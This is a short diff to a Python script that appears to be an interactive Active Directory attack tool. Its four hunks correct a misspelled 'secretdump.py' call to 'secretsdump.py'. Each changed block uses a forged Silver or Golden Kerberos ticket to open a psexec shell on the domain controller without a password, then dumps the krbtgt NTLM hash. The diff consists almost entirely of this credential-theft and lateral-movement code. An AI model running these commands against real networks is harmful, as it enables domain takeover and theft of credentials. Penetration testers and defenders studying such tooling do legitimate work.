@@ -1572,7 +1572,7 @@ while True:
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
              print("\n[-] Silver TGT was not generated...")      
 
@@ -1589,7 +1589,7 @@ while True:
 
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
             print("\n[-] Silver TGT was not generated...")
       prompt()
@@ -1625,7 +1625,7 @@ while True:
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
             print("[-] Golden TGT was not generated...")
 
@@ -1641,7 +1641,7 @@ while True:
 
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(PATH + "secretdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
          else:
             print("[-] Golden TGT was not generated...")
       prompt()
